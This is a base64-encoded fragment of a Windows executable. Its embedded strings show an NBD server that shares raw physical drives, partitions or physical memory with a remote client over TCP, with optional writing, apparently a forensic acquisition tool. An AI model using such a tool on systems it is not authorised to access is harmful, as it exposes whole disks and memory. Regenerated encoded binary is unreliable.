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gKCBcXC5cUEhZU0lDQUxEUklWRTAgZm9yIGV4YW1wbGUpACAtbiAgICAgUGFydGl0aW9uIG9uIGRpc2sgdG8gc2VydmUgKDAgaWYgbm90IHNwZWNpZmllZCksIC1uIGFsbCB0byBzZXJ2ZSBhbGwgcGFydGl0aW9ucwAgLXcgICAgIEVuYWJsZSB3cml0aW5nIChkaXNhYmxlZCBieSBkZWZhdWx0KQAAAAAgLWQgICAgIEVuYWJsZSBkZWJ1ZyBtZXNzYWdlcwAAACAtcSAgICAgQmUgUXVpZXQuLm5vIG1lc3NhZ2VzAAAAIC1oICAgICBUaGlzIGhlbHAgdGV4dAAAWypdIAAAAABbK10gAAAAAFstXSAAAAAAQ29ubmVjdGlvbiBkcm9wcGVkLiBFcnJvcjogJWx1AABvcGVuaW5nIG1lbW9yeQAAb3BlbmluZyBmb3Igd3JpdGluZwBvcGVuaW5nIHJlYWQtb25seQAAAEVycm9yIG9wZW5pbmcgZmlsZSAlczogJXUAAABcXC5cUEhZU0lDQUxEUklWRQAAAENhbm5vdCBvYnRhaW4gZHJpdmUgbGF5b3V0OiAldQAAUmVxdWVzdCBubyBpbyBib3VuZGFyeSBjaGVja3MgZmFpbGVkLiBFcnJvcjogJXUAQm91bmRhcnkgY2hlY2tzIHR1cm5lZCBvZmYuAERpc2tMZW5ndGg6ICVsbGQAAAAAQ2Fubm90IGRldGVybWluZSBEaXNrIGxlbmd0aC4gRXJyb3I6ICV1AFRhcmdldGluZyBvbmx5IHBhcnRpdGlvbiAlZABQYXJ0aXRpb24gJWQgaXMgb2YgdHlwZSAlMDJ4AAAAAE9mZnNldDogJWxsZCAoJWxseCkATGVuZ3RoOiAlbGxkICglbGx4KQBcXC5cAAAAAFZvbHVtZUxlbmd0aDogJWxsZAAAQ2Fubm90IGRldGVybWluZSBWb2x1bWUgbGVuZ3RoLiBFcnJvcjogJXUAAABGYWlsZWQgdG8gc2V0IGFjcXVpc2l0aW9uIG1vZGUuAEZhaWxlZCB0byBnZXQgbWVtb3J5IGdlb21ldHJ5LgAAQ1IzOiAweCUwMTBsbFggJWQgbWVtb3J5IHJhbmdlczoAAAAAU3RhcnQgMHglMDhsbFggLSBMZW5ndGggMHglMDhsbFgAAAAARmFpbGVkIHRvIG9idGFpbiBmaWxlc2l6ZSBpbmZvOiAldQAATmVnb3RpYXRpbmcuLi5zZW5kaW5nIE5CRE1BR0lDIGhlYWRlcgAAAE5CRE1BR0lDAAAAAEZhaWxlZCB0byBzZW5kIG1hZ2ljIHN0cmluZwBGYWlsZWQgdG8gc2VuZCAybmQgbWFnaWMgc3RyaW5nLgAAAABGYWlsZWQgdG8gc2VuZCBmaWxlc2l6ZS4AAAAARmFpbGVkIHRvIHNlbmQgYSBjb3VwbGUgb2YgMHgwMHMAAAAAU3RhcnRlZCEAAAAARmFpbGVkIHRvIHJlYWQgZnJvbSBzb2NrZXQuAHdyaXRlOgAAcmVhZAAAAABSZXF1ZXN0OiAlcyBGcm9tOiAlbGxkIExlbjogJWx1IAAAAABVbmV4cGVjdGVkIHByb3RvY29sIHZlcnNpb24hIChnb3Q6ICVseCwgZXhwZWN0ZWQ6IDB4MjU2MDk1MTMpAAAASW52YWxpZCByZXF1ZXN0OiBGcm9tOiVsbGQgTGVuOiVsdQAARmFpbGVkIHRvIHNlbmQgZXJyb3IgcGFja2V0IHRocm91Z2ggc29ja2V0LgBUZXJtaW5hdGluZyBjb25uZWN0aW9uIGR1ZSB0byBJbnZhbGlkIHJlcXVlc3Q6IEZyb206JWxsZCBMZW46JWx1AAAAAEVycm9yIHNlZWtpbmcgaW4gZmlsZSAlcyB0byBwb3NpdGlvbiAlbGxkICglbGx4KTogJXUAAAAAU2VuZGluZyBlcnJubz0lZAAAAABGYWlsZWQgdG8gc2VuZCBlcnJvciBzdGF0ZSB0aHJvdWdoIHNvY2tldC4AAHJlY3YgbWF4ICVkIGJ5dGVzAAAAV3JpdGVGaWxlICVkIGJ5dGVzIG9mICVkIGJ5dGVzIGluIGJ1ZmZlcgAAAABGYWlsZWQgdG8gd3JpdGUgJWQgYnl0ZXMgdG8gJXM6ICV1AABCbG9jayBzaXplIGluY29uc2lzdGVuY3k6ICVkAAAAAENvbm5lY3Rpb24gd2FzIGRyb3BwZWQgd2hpbGUgcmVjZWl2aW5nIGRhdGEuAAAAAEZhaWxlZCB0byBzZW5kIHRocm91Z2ggc29ja2V0LgAAU2VuZGluZyBwYWQ6ICVsbGQsJWQAAAAAU2VuZGluZyBtZW06ICVsbGQsJWQAAAAARmFpbGV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5X3MAAJYFZndyaXRlAAB2BWZjbG9zZQAAcwVleGl0AABjAD8/MkBZQVBBWElAWgAATVNWQ1IxMDAuZGxsAACxBF92c25wcmludGYAAI0EX3VubG9jawBbAV9fZGxsb25leGl0ACMDX2xvY2sAyQNfb25leGl0AMUBX2Ftc2dfZXhpdAAAYwFfX2dldG1haW5hcmdzANwBX2NleGl0AAAqAl9leGl0AC0BX1hjcHRGaWx0ZXIAZAFfX2luaXRlbnYAsAJfaW5pdHRlcm0AsQJfaW5pdHRlcm1fZQDsAV9jb25maWd0aHJlYWRsb2NhbGUAogFfX3NldHVzZXJtYXRoZXJyAADrAV9jb21tb2RlAABFAl9mbW9kZQAAnwFfX3NldF9hcHBfdHlwZQAA+wFfY3J0X2RlYnVnZ2VyX2hvb2sAACECX2V4Y2VwdF9oYW5kbGVyNF9jb21tb24AAgE/dGVybWluYXRlQEBZQVhYWgDuAD9fdHlwZV9pbmZvX2R0b3JfaW50ZXJuYWxfbWV0aG9kQHR5cGVfaW5mb0BAUUFFWFhaAAC4Al9pbnZva2Vfd2F0c29uAADvAV9jb250cm9sZnBfcwAARQE/P183PyRiYXNpY19vc3RyZWFtQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBANkJAAACaAT9fQkFET0ZGQHN0ZEBAM19KQgAApwI/Y291dEBzdGRAQDNWPyRiYXNpY19vc3RyZWFtQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQDFAQQAAlQI/Y2VyckBzdGRAQDNWPyRiYXNpY19vc3RyZWFtQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQDFAQQAAjgI/X1hvdXRfb2ZfcmFuZ2VAc3RkQEBZQVhQQkRAWgCeAD8/MV9Mb2NraXRAc3RkQEBRQUVAWFoAAGAAPz8wX0xvY2tpdEBzdGRAQFFBRUBIQFoAjAI/X1hsZW5ndGhfZXJyb3JAc3RkQEBZQVhQQkRAWgANBj91bmNhdWdodF9leGNlcHRpb25Ac3RkQEBZQV9OWFoA0gE/X0dldGdsb2JhbGxvY2FsZUBsb2NhbGVAc3RkQEBDQVBBVl9Mb2NpbXBAMTJAWFoAAKgBP19GaW9wZW5Ac3RkQEBZQVBBVV9pb2J1ZkBAUEJESEhAWgAA/wM/aWRAPyRjb2RlY3Z0QERESEBzdGRAQDJWMGxvY2FsZUAyQEEAAEIBPz9fNz8kYmFzaWNfaXN0cmVhbUBEVT8kY2hhcl90cmFpdHNAREBzdGRAQEBzdGRAQDZCQAAAyAU/c3B1dG5APyRiYXNpY19zdHJlYW1idWZARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBRQUVfSlBCRF9KQFoAALABP19HZXRjYXRAPyRjb2RlY3Z0QERESEBzdGRAQFNBSVBBUEJWZmFjZXRAbG9jYWxlQDJAUEJWNDJAQFoAUwI/X09zZnhAPyRiYXNpY19vc3RyZWFtQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBAUUFFWFhaA